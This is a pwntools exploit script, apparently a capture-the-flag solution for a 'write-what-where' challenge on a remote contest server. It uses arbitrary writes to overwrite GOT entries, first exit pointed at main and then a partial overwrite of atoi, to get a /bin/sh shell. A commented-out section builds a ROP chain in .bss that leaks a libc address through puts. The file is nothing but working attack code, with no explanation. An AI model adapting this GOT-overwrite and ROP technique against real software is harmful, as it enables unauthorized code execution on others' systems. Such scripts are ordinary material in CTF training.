from pwn import *

debug = 0

if(debug):
	r = process("./write-what-where")
	gdb.attach(r)
else:
	r = remote("pwn-2021.duc.tf", 31920)

main = 0x4011a9
read_got = 0x404020
exit_got = 0x404038
atoi_got = 0x404030
pop_rsp_pop3_ret = 0x00000000004012ad
pop_rdi_ret = 0x00000000004012b3
pop_rsi_r15_ret = 0x00000000004012b1
pop2_ret = 0x00000000004012b0
pop4_ret = 0x00000000004012ac
puts = 0x401030
read = 0x401040

bss_addr = 0x0000000000404110

def fast(place, value):
	r.send(p32(value))
	r.recvuntil(b'where?')
	r.send(str(place))		
	r.recvuntil(b'what?')
# infinity main
fast(exit_got, main)
fast(atoi_got - 2, 0xfa600000)

r.sendline("1")
r.recvuntil(b'where?')
r.sendline(b'/bin/sh\x00')


r.interactive()


'''
# setup ROPchain in .bss
fast(bss_addr, 0)
fast(bss_addr + 0x8, 0)
fast(bss_addr + 0x10, 0)
fast(bss_addr + 0x18, pop_rdi_ret)
fast(bss_addr + 0x18 + 4, 0)
fast(bss_addr + 0x20, atoi_got)
fast(bss_addr + 0x20 + 4, 0)
fast(bss_addr + 0x28, puts)
fast(bss_addr + 0x28 + 4, 0)
fast(bss_addr + 0x30, pop_rdi_ret)
fast(bss_addr + 0x30 + 4, 0)
fast(bss_addr + 0x38, 0)
fast(bss_addr + 0x40, pop_rsi_r15_ret)
fast(bss_addr + 0x40 + 4, 0)
fast(bss_addr + 0x48, bss_addr + 0x68)
fast(bss_addr + 0x48 + 4, 0)
fast(bss_addr + 0x50, 0)
fast(bss_addr + 0x58, read)
fast(bss_addr + 0x58 + 4, 0)
fast(bss_addr + 0x60, pop_rdi_ret)
fast(bss_addr + 0x60 + 4, 0)


fast(atoi_got, pop2_ret)

#stuff = r.recv()
#print(stuff)
'''
